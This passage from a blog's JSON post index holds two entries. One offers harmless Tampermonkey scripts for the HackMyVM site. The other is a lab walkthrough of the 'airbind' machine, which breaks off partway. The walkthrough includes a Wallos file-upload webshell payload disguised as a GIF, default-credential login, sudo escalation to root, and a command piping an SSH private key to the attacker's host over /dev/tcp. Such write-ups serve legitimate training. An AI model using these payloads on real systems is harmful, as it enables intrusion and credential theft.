\u4e86\u3002\u4e0d\u8fc7\uff0c\u521a\u4e0a\u624b\u53ef\u80fd\u4f1a\u9047\u5230\u4e9b\u5c0f\u9ebb\u70e6\u3002\n\n\u6bd4\u5982\u6211\u81ea\u5df1\u73a9\u7684\u65f6\u5019\uff0c\u5c31\u7ecf\u5e38\u56e0\u4e3a\u53d1\u5446\u592a\u4e45\uff08\u6216\u8005\u67e5\u8d44\u6599\u65f6\u95f4\u957f\u4e86\u70b9\uff09\u5bfc\u81f4\u4f1a\u8bdd\u8d85\u65f6\uff0c\u6bcf\u6b21\u90fd\u5f97\u91cd\u65b0\u767b\u5f55\uff0c**\u633a\u70e6\u4eba\u7684**\u3002\u8fd8\u6709\uff0c\u6253 Challenge \u7684\u65f6\u5019\uff0c\u6bcf\u6b21\u63d0\u4ea4\u5b8c Flag \u90fd\u5f97**\u624b\u52a8\u53bb\u6539 URL \u8df3\u5230\u4e0b\u4e00\u4e2a**\uff0c\u70b9\u51e0\u4e0b\u4e5f\u662f\u6709\u70b9\u5c0f\u4e0d\u723d\u3002\n\n\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e24\u4e2a\u75db\u70b9\uff0c\u6211\u5229\u7528 AI \u6363\u9f13\u4e86\u4e00\u4e2a\u6cb9\u7334\u811a\u672c\uff0c\u4e5f\u590d\u5236\u7ed9\u5927\u5bb6 Todd \u5927\u4f6c\u7684\u4e00\u4e2a\u811a\u672c\uff0c\u5e0c\u671b\u80fd\u8ba9\u5927\u5bb6\u7684 HackMyVM \u4f53\u9a8c**\u66f4\u8212\u670d\u4e00\u70b9**\u3002\ud83d\udc4d\n\n---\n\n## 2. \u811a\u672c\u4e00\uff1a\u4fdd\u6301\u5728\u7ebf\u4e0d\u6389\u7ebf\u23f3\n\n### 2.1. \u5b83\u80fd\u5e72\u5565\uff1f\n\n\u8fd9\u4e2a\u811a\u672c\u4e3b\u8981\u5c31\u662f\u4e3a\u4e86\u9632\u6b62\u4f60\u56e0\u4e3a\u957f\u65f6\u95f4\u6ca1\u5728 HackMyVM \u9875\u9762\u4e0a\u64cd\u4f5c\u800c\u88ab\u5f3a\u5236\u8e22\u4e0b\u7ebf\u3002\u5b83\u4f1a**\u6084\u6084\u5730\u5728\u540e\u53f0\u5e2e\u4f60\u81ea\u52a8\u5237\u65b0\u9875\u9762**\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u5b89\u5fc3\u5730\u67e5\u8d44\u6599\u3001\u5199\u7b14\u8bb0\u6216\u8005\u6682\u65f6\u79bb\u5f00\u4e00\u4e0b\uff0c\u4e0d\u7528\u62c5\u5fc3\u56de\u6765\u53c8\u8981\u91cd\u65b0\u767b\u5f55\u4e86\u3002\n\n### 2.2. \u5b83\u662f\u600e\u4e48\u5de5\u4f5c\u7684\uff1f\n\n```javascript\n// ==UserScript==\n// @name         \u4fdd\u6301hackmyvm\u7684\u767b\u5f55\u72b6\u6001\n// @namespace    http://tampermonkey.net/\n// @version      2.0\n// @description  \u5b9a\u65f6\u5237\u65b0\u9875\u9762\uff0c\u4fdd\u6301\u767b\u5f55\u72b6\u6001\uff0c\u76ee\u524d 5 \u5206\u949f\n// @require\n// @author       Todd\n// @match        https://hackmyvm.eu/*\n// @grant        none\n// ==/UserScript==\n\n(function () {\n  'use strict';\n  // \u8bbe\u7f6e\u4e00\u4e2a\u5b9a\u65f6\u5668\uff0c\u6bcf\u9694 5 \u5206\u949f\uff08300,000 \u6beb\u79d2\uff09\u5c31\u8ba9\u5b83\u5e72\u70b9\u4e8b\n  setInterval(() => {\n    // \u5e72\u7684\u4e8b\u5c31\u662f\uff1a\u5237\u65b0\u4e00\u4e0b\u5f53\u524d\u9875\u9762\n    location.reload();\n  }, 1000 * 60 * 5); // 1\u79d2 * 60 * 5 = 5\u5206\u949f\n})();\n```\n\n*   `@match https://hackmyvm.eu/*`: \u8fd9\u884c\u662f\u544a\u8bc9\u6cb9\u7334\uff08Tampermonkey\uff09\uff0c\u8fd9\u4e2a\u811a\u672c\u53ea\u5728 HackMyVM \u7f51\u7ad9 (`https://hackmyvm.eu/`) \u4e0b\u7684\u6240\u6709\u9875\u9762\u751f\u6548\u3002\n*   `setInterval(() => location.reload(), 1000 * 60 * 5);`: \u8fd9\u662f\u811a\u672c\u7684\u6838\u5fc3\u3002`setInterval` \u4f1a\u8ba9\u6d4f\u89c8\u5668**\u6bcf\u9694 5 \u5206\u949f**\u5c31\u6267\u884c\u4e00\u6b21 `location.reload()` \u8fd9\u4e2a\u547d\u4ee4\uff0c\u4e5f\u5c31\u662f\u5237\u65b0\u5f53\u524d\u9875\u9762\uff0c\u6a21\u62df\u4f60\u8fd8\u5728\u6d3b\u8dc3\u72b6\u6001\uff0c\u4ece\u800c\u4fdd\u6301\u767b\u5f55\u3002\n\n### 2.3. \u8c01\u5199\u7684\uff1f\n\n\u8fd9\u4e2a\u811a\u672c\u662f **Todd** \u5927\u4f6c\u5199\u7684\u3002\u819c\u62dc\u5927\u4f6c\uff01orz\n\n> **P.S.** \u5982\u679c\u60f3\u53bb Todd \u5927\u4f6c\u7684\u535a\u5ba2\u770b\u770b\uff0c\u53ef\u4ee5\u70b9\u51fb[**\u8fd9\u91cc**](https://blog.findtodd.com/)\uff0c\u6216\u8005\u53bb\u6211\u7684\u53cb\u94fe\u9875\u9762\u4e5f\u80fd\u627e\u5230\u8df3\u8f6c\u94fe\u63a5\u3002\n\n### 2.4. \u4ec0\u4e48\u60c5\u51b5\u4e0b\u7528\u6bd4\u8f83\u597d\uff1f\n\n**\u5f3a\u70c8\u63a8\u8350**\u7ed9\u9700\u8981\u5728 HackMyVM \u4e0a\u67e5\u8d44\u6599\u3001\u5199 Writeup\uff0c\u6216\u8005\u53ea\u662f\u6302\u7740\u9875\u9762\u601d\u8003\u89e3\u9898\u601d\u8def\u7684\u670b\u53cb\u4eec\u3002\u6709\u4e86\u5b83\uff0c\u9ebb\u9ebb\u518d\u4e5f\u4e0d\u7528\u62c5\u5fc3\uff0c\u6211\u52a8\u4e0d\u52a8\u5c31\u5f97\u91cd\u65b0\u767b\u5f55\u4e86\uff0c\u5c31\u7b97\u4f60\u6682\u65f6\u79bb\u5f00\u7535\u8111\u4e00\u4f1a\u513f\uff0c\u4e5f\u80fd\u5e2e\u4f60\u4fdd\u4f4f\u767b\u5f55\u72b6\u6001\u3002\n\n---\n\n## 3. \u811a\u672c\u4e8c\uff1a\u6311\u6218\u5173\u5361\u5feb\u901f\u8df3\u8f6c\ud83d\ude80\n\n### 3.1. \u5b83\u80fd\u5e72\u5565\uff1f\n\n\u6253 Challenge \u65f6\u662f\u4e0d\u662f\u89c9\u5f97\u6bcf\u6b21\u8f93\u5b8c Flag \u90fd\u8981\u624b\u52a8\u6539 URL \u53bb\u4e0b\u4e00\u4e2a\u6709\u70b9\u70e6\uff1f\u8fd9\u4e2a\u811a\u672c\u5c31\u662f\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\uff01\n\n\u5b83\u7ed9 HackMyVM \u7684\u6311\u6218\u9875\u9762 (`challenge.php`) \u52a0\u4e86\u4e2a\u5feb\u6377\u64cd\u4f5c\uff1a\u4f60\u53ef\u4ee5\u76f4\u63a5 **\u6309\u9f20\u6807\u4fa7\u952e**\uff08\u901a\u5e38\u662f\u201c\u524d\u8fdb\u201d\u90a3\u4e2a\u6309\u94ae\uff0c\u4e00\u822c\u662f `Button 4`\uff09\u6216\u8005**\u952e\u76d8\u7684\u53f3\u7bad\u5934 `\u2192`**\uff0c\u811a\u672c\u5c31\u4f1a\u81ea\u52a8\u5e2e\u4f60\u8df3\u8f6c\u5230\u4e0b\u4e00\u4e2a Challenge \u9875\u9762\uff0c**\u7701\u4e8b\u591a\u4e86**\uff01\n\n### 3.2. \u5b83\u662f\u600e\u4e48\u5de5\u4f5c\u7684\uff1f\n\n```javascript\n// ==UserScript==\n// @name         HackMyVM\u6311\u6218\u9875\u9762\u5feb\u901f\u5bfc\u822a\n// @namespace    http://tampermonkey.net/\n// @version      0.1\n// @description  \u4f7f\u7528\u9f20\u6807\u4fa7\u4e0a\u952e\u6216\u53f3\u7bad\u5934\u5feb\u901f\u5bfc\u822a\u5230\u4e0b\u4e00\u4e2a\u6311\u6218\u9875\u9762\n// @author       AI & YourName (Modify)\n// @match        https://hackmyvm.eu/challenges/challenge.php?c=*\n// @grant        none\n// ==/UserScript==\n\n(function() {\n    'use strict';\n\n    // \u5c01\u88c5\u4e00\u4e2a\u8df3\u8f6c\u5230\u4e0b\u4e00\u5173\u7684\u52a8\u4f5c\n    function navigateToNextChallenge() {\n        const currentUrl = window.location.href; // \u83b7\u53d6\u5f53\u524d\u9875\u9762\u7684\u7f51\u5740\n        // \u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6293\u53d6\u7f51\u5740\u91cc c= \u540e\u9762\u7684\u6570\u5b57 (\u6311\u6218\u7f16\u53f7)\n        const challengeMatch = currentUrl.match(/c=(\\d+)/);\n\n        if (challengeMatch && challengeMatch[1]) { // \u786e\u4fdd\u6293\u5230\u4e86\u7f16\u53f7\n            // \u628a\u6293\u5230\u7684\u7f16\u53f7\u5b57\u7b26\u4e32\u8f6c\u6210\u6570\u5b57\n            const currentChallenge = parseInt(challengeMatch[1], 10);\n            // \u8ba1\u7b97\u4e0b\u4e00\u4e2a\u6311\u6218\u7684\u7f16\u53f7\n            const nextChallenge = currentChallenge + 1;\n            // HackMyVM \u7684\u7f16\u53f7\u901a\u5e38\u662f\u4e09\u4f4d\u6570 (\u5982 001, 019)\uff0c\u6240\u4ee5\u683c\u5f0f\u5316\u4e00\u4e0b\uff0c\u4e0d\u591f\u4e09\u4f4d\u524d\u9762\u8865 0\n            const formattedNextChallenge = String(nextChallenge).padStart(3, '0');\n            // \u628a\u5f53\u524d\u7f51\u5740\u91cc\u7684 'c=\u65e7\u7f16\u53f7' \u66ff\u6362\u6210 'c=\u65b0\u7f16\u53f7'\uff0c\u5f97\u5230\u65b0\u7f51\u5740\n            const newUrl = currentUrl.replace(/c=\\d+/, 'c=' + formattedNextChallenge);\n            // \u8df3\u8f6c\u5230\u65b0\u7f51\u5740\n            window.location.href = newUrl;\n        }\n    }\n\n    // \u76d1\u542c\u9f20\u6807\u6309\u952e\u62ac\u8d77\u4e8b\u4ef6\n    document.addEventListener('mouseup', function(event) {\n        // \u68c0\u67e5\u662f\u4e0d\u662f\u9f20\u6807\u4fa7\u952e\uff08\u524d\u8fdb\u952e\uff0c\u6309\u94ae\u7f16\u53f7\u901a\u5e38\u662f 4\uff09\n        if (event.button === 4) { // button 4 \u901a\u5e38\u662f\u4fa7\u524d\u952e\n            navigateToNextChallenge(); // \u662f\u7684\u8bdd\uff0c\u5c31\u6267\u884c\u8df3\u8f6c\n        }\n    });\n\n    // \u76d1\u542c\u952e\u76d8\u6309\u952e\u6309\u4e0b\u4e8b\u4ef6\n    document.addEventListener('keydown', function(event) {\n        // \u68c0\u67e5\u662f\u4e0d\u662f\u6309\u4e86\u53f3\u7bad\u5934\u952e\n        if (event.key === 'ArrowRight') {\n            navigateToNextChallenge(); // \u662f\u7684\u8bdd\uff0c\u4e5f\u6267\u884c\u8df3\u8f6c\n        }\n    });\n\n})();\n```\n\n*   `@match https://hackmyvm.eu/challenges/challenge.php?c=*`: \u8fd9\u4e2a\u811a\u672c\u4e13\u95e8\u9488\u5bf9**\u6311\u6218\u9875\u9762**\uff0c\u6240\u4ee5\u53ea\u5728\u7f51\u5740\u5339\u914d\u8fd9\u4e2a\u6a21\u5f0f (`challenge.php` \u540e\u9762\u8ddf\u7740 `?c=`) \u7684\u65f6\u5019\u8fd0\u884c\u3002\n*   `navigateToNextChallenge()`: \u8fd9\u662f\u6838\u5fc3\u7684\u8df3\u8f6c\u903b\u8f91\u51fd\u6570\u3002\u5b83\u4f1a\uff1a\n    1.  \u62ff\u5230\u4f60\u5f53\u524d\u6240\u5728\u6311\u6218\u9875\u9762\u7684 URL\u3002\n    2.  \u7528**\u6b63\u5219\u8868\u8fbe\u5f0f**\u4ece URL \u91cc\u628a\u6311\u6218\u7f16\u53f7\uff08\u6bd4\u5982 `c=005` \u91cc\u7684 `005`\uff09\u62a0\u51fa\u6765\u3002\n    3.  \u628a\u7f16\u53f7\u52a0 1\uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a\u6311\u6218\u7684\u7f16\u53f7\u3002\n    4.  **\u7279\u522b\u5904\u7406**\uff1a\u56e0\u4e3a HackMyVM \u7684\u7f16\u53f7\u559c\u6b22\u7528**\u4e09\u4f4d\u6570**\uff08\u50cf `001`, `020` \u8fd9\u79cd\uff09\uff0c\u6240\u4ee5\u811a\u672c\u4f1a\u628a\u65b0\u7684\u7f16\u53f7\u4e5f**\u683c\u5f0f\u5316\u6210\u4e09\u4f4d\u6570**\uff08\u6bd4\u5982 `6` \u4f1a\u53d8\u6210 `006`\uff09\uff0c\u4e0d\u8db3\u4e09\u4f4d\u524d\u9762\u8865 `0`\u3002\n    5.  \u6700\u540e\uff0c\u751f\u6210\u4e00\u4e2a\u65b0\u7684 URL\uff08\u628a\u65e7\u7f16\u53f7\u66ff\u6362\u6210\u65b0\u7f16\u53f7\uff09\uff0c\u7136\u540e\u8ba9\u6d4f\u89c8\u5668\u8df3\u8f6c\u8fc7\u53bb\u3002\n*   `addEventListener('mouseup', ...)`: \u8fd9\u90e8\u5206\u662f**\u76d1\u542c\u9f20\u6807\u6309\u952e\u62ac\u8d77**\u7684\u52a8\u4f5c\u3002\u5982\u679c\u677e\u5f00\u7684\u662f\u9f20\u6807\u4fa7\u524d\u952e\uff08`event.button === 4`\uff09\uff0c\u5c31\u8c03\u7528\u4e0a\u9762\u7684\u8df3\u8f6c\u51fd\u6570\u3002\n*   `addEventListener('keydown', ...)`: \u8fd9\u90e8\u5206\u662f**\u76d1\u542c\u952e\u76d8\u6309\u952e\u6309\u4e0b**\u7684\u52a8\u4f5c\u3002\u5982\u679c\u6309\u7684\u662f\u53f3\u7bad\u5934\uff08`event.key === 'ArrowRight'`\uff09\uff0c\u4e5f\u8c03\u7528\u8df3\u8f6c\u51fd\u6570\u3002\n\n### 3.3. \u8c01\u5199\u7684\uff1f\n\n\u8fd9\u4e2a\u811a\u672c\u4e3b\u8981\u662f **AI** \u7f16\u5199\u7684\u3002\uff08\u6211\u5c31\u8d77\u5230\u4e86\u4e00\u4e2a `Ctrl+C` / `Ctrl+V` \ud83d\ude09\uff09\u3002\n\n### 3.4. \u4ec0\u4e48\u60c5\u51b5\u4e0b\u7528\u6bd4\u8f83\u597d\uff1f\n\n\u5982\u679c\u4f60\u559c\u6b22**\u6309\u987a\u5e8f\u5237 HackMyVM \u7684 Challenge**\uff0c\u8fd9\u4e2a\u811a\u672c\u7edd\u5bf9\u662f\u63d0\u5347\u6548\u7387\u7684\u795e\u5668\uff01\u5b83\u80fd\u5e2e\u4f60\u7701\u4e0b\u4e0d\u5c11\u70b9\u51fb\u548c\u4fee\u6539 URL \u7684\u65f6\u95f4\uff0c\u8ba9\u5237\u9898\u8fc7\u7a0b**\u66f4\u6d41\u7545**\u3001**\u4f53\u9a8c\u66f4\u597d**\u3002\nsentence", "top": 0, "createdAt": 1751016743, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P88": {"htmlDir": "docs/post/hmv_airbind.html", "labels": ["HackMyVM"], "postTitle": "hmv_airbind", "postUrl": "post/hmv_airbind.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/88", "commentNum": 0, "wordCount": 7692, "description": "# hmv_airbind\n\n**\u9776\u673a**\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=airbind\n**\u96be\u5ea6**\uff1a\u9ec4\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.212\n**\u672c\u673a** IP\uff1a192.168.205.141\n\n---\n\n### **1. \u7aef\u53e3\u679a\u4e3e\u53ca\u670d\u52a1\u63a2\u6d4b**\n\n\u9996\u5148\uff0c\u4f7f\u7528 `nmap` \u626b\u63cf\u76ee\u6807 IP \u7684\u5f00\u653e\u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sV -sT -O -Pn -n -p- 192.168.205.212\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 17:39 CST\nNmap scan report for 192.168.205.212\nHost is up (0.00029s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE    SERVICE VERSION\n22/tcp filtered ssh\n80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))\nMAC Address: 08:00:27:AD:E1:D7 (Oracle VirtualBox virtual NIC)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.94SVN%E=4%D=12/29%OT=80%CT=1%CU=32430%PV=Y%DS=1%DC=D%G=Y%M=0800\nOS:27%TM=677118F6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%\nOS:II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11N\nOS:W7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8\nOS:8%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F\nOS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T\nOS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=\nOS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(\nOS:R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 1 hop\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 18.31 seconds\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u673a\u5668\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u7aef\u53e3\u3002\n\n---\n\n### **2. Web \u670d\u52a1\u63a2\u6d4b\u4e0eWallos \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e**\n\n\u5bf9 80 \u7aef\u53e3\u611f\u5174\u8da3\uff0c\u8bbf\u95ee Web \u9875\u9762\uff0c\u662f\u4e2a\u767b\u5f55\u7f51\u9875\uff0c\u626b\u63cf\u4e00\u4e0b\u7ed3\u6784\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ whatweb http://192.168.205.212/login.php\nhttp://192.168.205.212/login.php [200 OK] Apache[2.4.57], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.205.212], PasswordField[password], Title[Wallos - Subscription Tracker]   \n```\n\n\u770b\u6709\u6ca1\u6709\u6f0f\u6d1e\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit Wallos\n----------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                       |  Path\n----------------------------------------------------------------------------------------------------- ---------------------------------\nWallos < 1.11.2 - File Upload RCE                                                                    | php/webapps/51924.txt\n----------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n                         \n```\n\n\u662f\u4e2a\u6587\u4ef6\u4e0a\u4f20\uff0c\u8981\u767b\u5f55\u8fdb\u53bb\uff0c\u5c1d\u8bd5\u4e00\u4e0b\u5f31\u5bc6\u7801\n\n`admin`:`admin`\u5c31\u8fd9\u4e48\u6c34\u7075\u7075\u7684\u8fdb\u53bb\u4e86\n\n[exploit-db](https://www.exploit-db.com/exploits/51924)\u60f3\u770b\u539f\u7248\u5229\u7528\u7684\u53ef\u4ee5\u5728\u8fd9\u770b,\u6211\u76f4\u63a5\u653e\u7ffb\u8bd1\u4e0a\u6765\u4e86\n\n```bash\n# \u6f0f\u6d1e\u6807\u9898\uff1aWallos - \u6587\u4ef6\u4e0a\u4f20 RCE\uff08\u5df2\u9a8c\u8bc1\uff09\n# \u65e5\u671f\uff1a2024-03-04\n# \u6f0f\u6d1e\u4f5c\u8005\uff1asml@lacashita.com\n# \u4f9b\u5e94\u5546\u4e3b\u9875\uff1ahttps://github.com/ellite/Wallos\n# \u8f6f\u4ef6\u94fe\u63a5\uff1ahttps://github.com/ellite/Wallos\n# \u7248\u672c\uff1a< 1.11.2\n# \u6d4b\u8bd5\u5e73\u53f0\uff1aDebian 12\n\nWallos \u5141\u8bb8\u60a8\u5728\u521b\u5efa\u65b0\u8ba2\u9605\u65f6\u4e0a\u4f20\u56fe\u50cf/\u5fbd\u6807\u3002\n\n\u53ef\u4ee5\u7ed5\u8fc7\u6b64\u6f0f\u6d1e\u6765\u4e0a\u4f20\u6076\u610f .php \u6587\u4ef6\u3002\n\nPOC\n---\n\n1) \u767b\u5f55\u5e94\u7528\u7a0b\u5e8f\u3002\n2) \u8f6c\u5230\u201c\u65b0\u8ba2\u9605\u201d\n3) \u4e0a\u4f20\u5fbd\u6807\u5e76\u9009\u62e9\u60a8\u7684 webshell .php\n4) \u53d1\u51fa\u8bf7\u6c42\uff0c\u5c06 Content-Type \u66f4\u6539\u4e3a image/jpeg \u5e76\u6dfb\u52a0\u201cGIF89a\u201d\uff0c\u5b83\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a\n\n--- SNIP -----------------\n\nPOST /endpoints/subscription/add.php HTTP/1.1\n\n\u4e3b\u673a\uff1a192.168.1.44\n\n\u7528\u6237\u4ee3\u7406\uff1aMozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n\n\u63a5\u53d7\uff1a*/*\n\n\u63a5\u53d7\u8bed\u8a00\uff1aen-US,en;q=0.5\n\n\u63a5\u53d7\u7f16\u7801\uff1agzip\uff0cdeflate\n\n\u5f15\u7528\uff1ahttp://192.168.1.44/\n\n\u5185\u5bb9\u7c7b\u578b\uff1amultipart/form-data;\u8fb9\u754c=---------------------------29251442139477260933920738324\n\n\u6765\u6e90\uff1ahttp://192.168.1.44\n\n\u5185\u5bb9\u957f\u5ea6\uff1a7220\n\n\u8fde\u63a5\uff1a\u5173\u95ed\n\nCookie\uff1atheme=light\uff1blanguage=en\uff1bPHPSESSID=6a3e5adc1b74b0f1870bbfceb16cda4b\uff1btheme=light\n\n-----------------------------29251442139477260933920738324\n\n\u5185\u5bb9\u5904\u7f6e\uff1aform-data\uff1bname='name'\n\n\u6d4b\u8bd5\n\n-----------------------------29251442139477260933920738324\n\n\u5185\u5bb9\u5904\u7f6e\uff1aform-data\uff1bname='logo'\uff1b filename='revshell.php'\n\nContent-Type: image/jpeg\n\nGIF89a;\n\n<?php\nsystem($_GET['cmd']);\n?>\n\n-----------------------------29251442139477260933920738324\n\nContent-Disposition: form-data; name='logo-url'\n\n----- SNIP -----\n\n5) \u60a8\u5c06\u6536\u5230\u6587\u4ef6\u5df2\u6210\u529f\u4e0a\u4f20\u7684\u54cd\u5e94\uff1a\n\n{'status':'Success','message':'Subscription updated successful'}\n\n6) \u60a8\u7684\u6587\u4ef6\u5c06\u4f4d\u4e8e\uff1a\nhttp://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php\n```\n\n\u603b\u7ed3\u4e00\u4e0b\u5c31\u662f\u7ecf\u5178\u7684gif\u4f2a\u88c5\uff0c\u628a\u4e0b\u9762\u5185\u5bb9\u505a\u4e2a`revshell.php.png`\u4f20\u4e0a\u53bb\uff0c\u62ffburp\u62e6\u4e00\u4e0b\u5220\u9664`.png`\u540e\u7f00\u5c31\u53ef\u4ee5\u4e86\uff08\u76f4\u63a5\u4f20\u4e0d\u4e00\u5b9a\u884c\uff0c\u4f60\u4eec\u53ef\u4ee5\u8bd5\u8bd5\uff09\n\n```bash\nGIF89a;\n\n<?php\nsystem($_GET['cmd']);\n?>\n```\n\n\u4f20\u4e0a\u53bb\u6253\u5f00`http://192.168.205.212/images/uploads/logos/`\u5c31\u53ef\u4ee5\u770b\u5230\u4e86\n\n![image](https://github.com/user-attachments/assets/509e49e8-17f9-46f4-b10e-7cba613d11db)\n\n`http://192.168.205.212/images/uploads/logos/1735465582-1.php?cmd=id`\u5c31\u4f1a\u53d1\u73b0\u6267\u884c\u6210\u529f\uff0c\u5efa\u8bae\u4f20\u4e2ash\u4e0a\u53bb\u62ffshell\uff0c\u6211\u8bd5\u4e862\u4e2a\u53cd\u5f39\u90fd\u5f39\u4e0d\u56de\u6765\n\n### 3.**\u83b7\u5f97\u7a33\u5b9a shell**\n\n\u83b7\u5f97\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n### 4.**\u63d0\u6743**\n\n\u4e0a\u5230\u53bb`sudo -l`\u6709\u60ca\u559c\n\n```bash\nwww-data@ubuntu:/home$ sudo -l\nMatching Defaults entries for www-data on ubuntu:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser www-data may run the following commands on ubuntu:\n    (ALL) NOPASSWD: ALL\n\n```\n\n\u6267\u884c\u4efb\u610f\u547d\u4ee4\n\n```bash\nwww-data@ubuntu:/home$ sudo bash -p\nroot@ubuntu:/home# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u5f53\u7136\u5f53\u4f60\u6253\u5f00`/root/`\u76ee\u5f55\uff0c\u4f60\u5c31\u4f1a\u770b\u5230\u53ea\u6709`user.txt`\uff0c\u6240\u4ee5\u8fd9\u4e2a\u5e94\u8be5\u662f\u4e00\u4e2a\u5bb9\u5668\n\n```bash\nroot@ubuntu:/home/ubuntu# hostname -I\n10.0.3.241 \n```\n\n\u786e\u5b9e\u662f\u5bb9\u5668\uff0c\u5728\u76ee\u5f55\u4e0b\u8fd8\u770b\u5230\u4e00\u4e2a`.ssh`\u7684\u767b\u5f55\u5bc6\u94a5,\u62ff\u8fc7\u53bb\u6211\u4eec\u90a3\u6d4b\u8bd5\u767b\u5f55\u771f\u673a\n\n```bash\n#\u5bb9\u5668\nroot@ubuntu:~/.ssh# cat id_rsa > /dev/tcp/192.168.205.141/7777\n#\u653b\u51fb\u673a\nnc -lvnp 7777 > id_rsa\n```\n\n\u6d4b\u8bd5\u767b\u5f55ipv4\u767b\u4e0d\u4e0a\uff0c\u4ed6\u628a\u7aef\u53e3\u5173\u4e86\uff08\u53ef\u4ee5\u770b\u6700\u524d\u9762\u7684\u626b\u63cf\u7ed3\u679c\uff09\uff0c\u90a3\u6211\u4eec\u5c31\u8fde\u63a5ipv6\n\n```bash\n\u2514\u2500$ ping6 -I eth0 ff02::1\nping6: Warning: source address might be selected on device other than: eth0\nPING ff02::1 (ff02::1) from :: eth0: 56 data bytes\n64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=1 ttl=64 time=0.148 ms\n64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=1 ttl=64 time=0.823 ms\n64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=2 ttl=64 time=0.055 ms\n64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=2 ttl=64 time=0.537 ms\n64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=3 ttl=64 time=0.047 ms\n64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=3 ttl=64 time=0.493 ms\n64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=4 ttl=64 time=0.038 ms\n64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=4 ttl=64 time=0.350 ms\n64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=5 ttl=64 time=0.041 ms\n64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=5 ttl=64 time=0.349 ms\n64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=6 ttl=64 time=0.035 ms\n64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=6 ttl=64 time=0.332 ms\n^C\n--- ff02::1 ping statistics ---\n6 packets transmitted, 6 received, +6 duplicates, 0% packet loss, time 5116ms\nrtt min/avg/max/mdev = 0.035/0.270/0.823/0.244 ms\n                                                                                  